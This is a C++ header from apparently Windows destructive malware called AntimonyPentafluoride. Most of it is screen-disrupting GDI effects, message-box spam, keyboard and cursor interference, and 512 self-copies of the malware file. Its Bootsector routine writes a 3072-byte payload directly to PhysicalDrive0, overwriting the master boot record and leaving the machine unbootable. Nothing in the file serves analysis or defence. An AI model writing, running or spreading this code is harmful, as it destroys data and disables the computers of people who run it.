#pragma once

#include "include.h"
#include "system.h"
#include "colors.h"
#include "maths.h"
#include "boot.h"

HDC dc = GetDC(NULL);
HDC dcCopy = CreateCompatibleDC(dc);

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);


void ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);

    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);

    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

namespace GDIPayloads
{
    DWORD WINAPI Reset(LPVOID lpParam)
    {
        while (true)
        {
            Sleep(1400);
            System::RedrawScreen();
        }
        return 0;
    }

    DWORD WINAPI Shake(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);
            Sleep(10);
            ReleaseDC(0, hdc);
        }
    }

    DWORD WINAPI Circles(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = GetSystemMetrics(0);
            int y = GetSystemMetrics(1);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            Ellipse(hdc, rand() % x, rand() % y, rand() % x, rand() % y);
            DeleteObject(brush);
            ReleaseDC(NULL, hdc);
            Sleep(10);
        }
    }

    DWORD WINAPI Shader1(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            HDC hdcMem = CreateCompatibleDC(hdc);
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hdcMem, bm);

            RECT rect;
            GetWindowRect(GetDesktopWindow(), &rect);

            POINT pt[3];
            pt[0].x = rect.left + rand() % 20;  pt[0].y = rect.top + rand() % 20;
            pt[1].x = rect.right - rand() % 20; pt[1].y = rect.top + rand() % 20;
            pt[2].x = rect.left + rand() % 20;  pt[2].y = rect.bottom - rand() % 20;

            PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);

            BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);

            DeleteObject(bm);
            DeleteDC(hdcMem);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
    }

    DWORD WINAPI InvertCircles(LPVOID lpParam)
    {
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        while (true) {
            ci(rand() % sw, rand() % sh, 150, 150);
            Sleep(100);
        }
    }

    DWORD WINAPI Icons(LPVOID lpParam)
    {
        HDC hDc = GetWindowDC(GetDesktopWindow());
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_QUESTION));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_WARNING));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_ASTERISK));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadIcon(0, IDI_SHIELD));
            Sleep(10);
        }
    }

    DWORD WINAPI Bright(LPVOID lpParam)
    {
        srand(static_cast<unsigned int>(time(0)));
        HDC desk;
        int x, t, sw, sh;
        while (true) {
            desk = GetDC(0);
            sw = GetSystemMetrics(SM_CXSCREEN);
            sh = GetSystemMetrics(SM_CYSCREEN);
            t = (rand() % sh);
            x = (rand() % 5);
            if (x == 0) {
                StretchBlt(desk, 2, t, sw + 4, t, desk, 0, t, sw, t, SRCPAINT);
            }
            else if (x == 1) {
                StretchBlt(desk, 0, t, sw, t, desk, 2, t, sw + 4, t, SRCAND);
            };
        };
    }

    DWORD WINAPI Tesseract(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(dc);
        HBITMAP memBM = CreateCompatibleBitmap(dc, w, h);
        SelectObject(memDC, memBM);

        float size = (float)(w + h) / 10.0f;
        int cx = (int)size, cy = (int)size;
        int xdv = 8, ydv = 8;
        float angleX = 0.02f, angleY = 0.03f, angleZ = 0.01f;
        int d = 60;

        VERTEX vtx[] = {
            {size, 0, 0}, {size, size, 0}, {0, size, 0}, {0, 0, 0}, // Bottom
            {size, 0, size}, {size, size, size}, {0, size, size}, {0, 0, size}, // Top
            {size - d, d, d}, {size - d, size - d, d}, {d, size - d, d}, {d, d, d}, // Inside Bottom
            {size - d, d, size - d}, {size - d, size - d, size - d}, {d, size - d, size - d}, {d, d, size - d} // Inside Top
        };

        EDGE edges[] = {
            {0,1}, {1,2}, {2,3}, {3,0}, {0,4}, {1,5}, {2,6}, {3,7}, {4,5}, {5,6}, {6,7}, {7,4}, // Outer
            {8,9}, {9,10}, {10,11}, {11,8}, {8,12}, {9,13}, {10,14}, {11,15}, {12,13}, {13,14}, {14,15}, {15,12}, // Inner
            {0,8}, {1,9}, {2,10}, {3,11}, {4,12}, {5,13}, {6,14}, {7,15} // Connections
        };

        HICON icons[] = { LoadIcon(NULL, IDI_WARNING), LoadIcon(NULL, IDI_WARNING), LoadIcon(NULL, IDI_WARNING), LoadIcon(NULL, IDI_WARNING) };
        int iconIdx = 0;

        int totvtx = sizeof(vtx) / sizeof(vtx[0]);
        int totedg = sizeof(edges) / sizeof(edges[0]);

        while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
            for (int i = 0; i < totvtx; i++) {
                _3D::RotateX(&vtx[i], angleX);
                _3D::RotateY(&vtx[i], angleY);
                _3D::RotateZ(&vtx[i], angleZ);
            }

            for (int i = 0; i < totedg; i++) {
                _3D::DrawEdge(dc, icons[iconIdx],
                    (int)vtx[edges[i].vtx0].x + cx, (int)vtx[edges[i].vtx0].y + cy,
                    (int)vtx[edges[i].vtx1].x + cx, (int)vtx[edges[i].vtx1].y + cy, 12);
            }

            cx += xdv; cy += ydv;
            if (cx > w - size || cx < 0) { xdv *= -1; iconIdx = rand() % 4; }
            if (cy > h - size || cy < 0) { ydv *= -1; iconIdx = rand() % 4; }

            Sleep(20);
        }

        DeleteObject(memBM);
        DeleteDC(memDC);
        ReleaseDC(NULL, dc);
        return 0;
    }

    DWORD WINAPI Colors1(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            HDC hdcMem = CreateCompatibleDC(hdc);
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hdcMem, bm);
            RECT rect;
            GetWindowRect(GetDesktopWindow(), &rect);
            POINT pt[3];
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
            DeleteObject(brush);
            DeleteObject(hdcMem); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(800);
            System::RedrawScreen();
        }
    }

    DWORD WINAPI Waves(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);

        int i = 0;

        while (true)
        {
            int waveAmplitude = rand() % 3;
            int wavePhase = rand() % 20;

            if (rand() % 25 == 0)
            {
                for (int y = 0; y < h; y++)
                {
                    int zx = Math::SineWave(waveAmplitude, y + i * 4, wavePhase, h);

                    BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);
                }

                Sleep(1);

                if (rand() % 25 == 0) System::RedrawScreen();

                i++;
            }
        }

        return 0x00;
    }

    DWORD WINAPI Shader4(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = screenWidth;
        bmpi.bmiHeader.biHeight = screenHeight;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

            RGBQUAD rgbquadCopy;

            for (int x = 0; x < screenWidth; x++)
            {
                for (int y = 0; y < screenHeight; y++)
                {
                    int index = y * screenWidth + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt((x ^ y) + x));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0x00;
    }

    DWORD WINAPI Neon(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(0);
            BitBlt(hdc, rand() % 2, rand() % 10, w, h, hdc, rand() % 2, rand() % 10, SRCINVERT);
            Sleep(10);
            System::RedrawScreen();
        }
    }

    DWORD WINAPI Inverting(LPVOID lpParam)
    {
        {
            while (1)
            {
                for (int x = 0; x <= w; x++)
                {
                    for (int y = 0; y <= h; y++)
                    {
                        int fx = x ^ y;
                        COLORREF color = RGB(fx, fx, fx);
                        HBRUSH brush = CreateSolidBrush(color);
                        SelectObject(dc, brush);

                        PatBlt(dc, 0, 0, w, h, PATINVERT);
                        Sleep(rand() % 50);
                    }
                }
            }

            return 0x00;
        }
    }

    DWORD WINAPI Masher(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(HWND_DESKTOP);
            int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
            BitBlt(hdc, rand() % 4567, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 45, rand() % 5, SRCCOPY);
            ReleaseDC(0, hdc);
        }
    }

    DWORD WINAPI Shader2(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = screenWidth;
        bmpi.bmiHeader.biHeight = screenHeight;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

            RGBQUAD rgbquadCopy;

            for (int x = 0; x < screenWidth; x++)
            {
                for (int y = 0; y < screenHeight; y++)
                {
                    int index = y * screenWidth + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(y ^ y | x));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0x00;

    }

    DWORD WINAPI Shader3(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = screenWidth;
        bmpi.bmiHeader.biHeight = screenHeight;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

            RGBQUAD rgbquadCopy;

            for (int x = 0; x < screenWidth; x++)
            {
                for (int y = 0; y < screenHeight; y++)
                {
                    int index = y * screenWidth + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ x | y));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0x00;
    }

    DWORD WINAPI Texts(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        LOGFONTW lFont = { 0 };

        //Setup our font style
        lFont.lfWidth = 20;
        lFont.lfHeight = 50;
        lFont.lfOrientation = 400;
        lFont.lfWeight = 800;
        lFont.lfUnderline = TRUE;
        lFont.lfQuality = DRAFT_QUALITY;
        lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

        lstrcpy(lFont.lfFaceName, L"Arial Black");

        while (true)
        {
            if (rand() % 25 == 24)
            {
                LPCSTR lpStrings[] =
                {
                    "Antimony", "Fluoridric", "Pentalfluoride", "Hydrogen", "Eletrons",
                    "Attack Calcium", "Fluorine", "H2O Firework", "Everything with water", "Acid",
                    "Corrosive", "Dangerous", "Toxic", "Volatile", "Reactive",
                    "Explosive", "Hydrogen Flouride", "Fluoroantimonic", "Hazardous", "Unstable"
                };

                lFont.lfEscapement = rand() % 60;

                HFONT hFont = CreateFontIndirectW(&lFont);
                SelectObject(dc, hFont);

                SetTextColor(dc, RGB(rand() % 0x02, rand() % 0x02, rand() % 0x02));
                SetBkColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));

                int index = rand() % 40;

                TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

                Sleep(rand() % 5);
            }
        }

        return 0x00;
    }

    DWORD WINAPI Colors2(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            HDC hdcMem = CreateCompatibleDC(hdc);
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hdcMem, bm);
            RECT rect;
            GetWindowRect(GetDesktopWindow(), &rect);
            POINT pt[3];
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
            DeleteObject(brush);
            DeleteObject(hdcMem); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }

    DWORD WINAPI Stretch(LPVOID lpParam)
    {
        HDC desk;
        int sw, sh;

        while (1) {
            desk = GetDC(0);
            sw = GetSystemMetrics(0);
            sh = GetSystemMetrics(1);
            StretchBlt(desk, -20, 0, sw + 40, sh, desk, 40, -20, sw, sh, SRCCOPY);
            ReleaseDC(0, desk);
            Sleep(4);
        }
    }

    DWORD WINAPI Cursors(LPVOID lpParam)
    {
        HDC hDc = GetWindowDC(GetDesktopWindow());
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        while (true)
        {
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadCursor(0, IDC_HAND));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadCursor(0, IDC_UPARROW));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadCursor(0, IDC_SIZEALL));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            DrawIcon(hDc, x, y, LoadCursor(0, IDC_NO));
            x = rand() % GetSystemMetrics(SM_CXSCREEN);
            y = rand() % GetSystemMetrics(SM_CYSCREEN);
            Sleep(10);
        }
    }
}

namespace SysPayloads
{
    DWORD WINAPI Messdesktop(LPVOID lpvd)
    {
        for (int i = 0; i < 512; i++)
        {
            System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"Oh" + i);
        }

        return 0;
    }

    DWORD WINAPI MessedLabels(LPVOID lpvd)
    {
        while (true)
        {
            HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
            EnumChildWindows(hwnd, System::EnumChildProc, NULL);
        }
    }

    DWORD WINAPI Msgbox(LPVOID lpParam)
    {
        while (1)
        {
            MessageBoxA(0, "You need to install Idiot.dll", "AntimonyPentafluoride - Error", MB_OK | MB_ICONERROR);
            Sleep(100);
            MessageBoxA(0, "THE END IS NEAR", "THE END IS NEAR", MB_OK | MB_ICONWARNING);
            Sleep(100);
        }
    }

    DWORD WINAPI KeyboardCAPS(LPVOID lpvd)
    {
        while (true)
        {
            System::PressKey(VK_CAPITAL, 500);
            System::PressKey(VK_SCROLL, 500);
        }

        return 0x00;
    }

    DWORD WINAPI CursorMove(LPVOID lpvd)
    {
        POINT pt;
        std::srand(static_cast<unsigned int>(std::time(nullptr)));

        while (true) {
            if (GetCursorPos(&pt)) {
                int dx = std::rand() % 11 - 5; // random between -5 and 5
                int dy = std::rand() % 11 - 5; // random between -5 and 5
                SetCursorPos(pt.x + dx, pt.y + dy);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(15));
        }

        return 0;
    }

    DWORD WINAPI Bootsector(LPVOID lpParam)
    {
        DWORD dwBytesWritten;

        HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

        WriteFile(hDrive, Fluor, 3072, &dwBytesWritten, NULL);
        CloseHandle(hDrive);

        return 0;
    }
}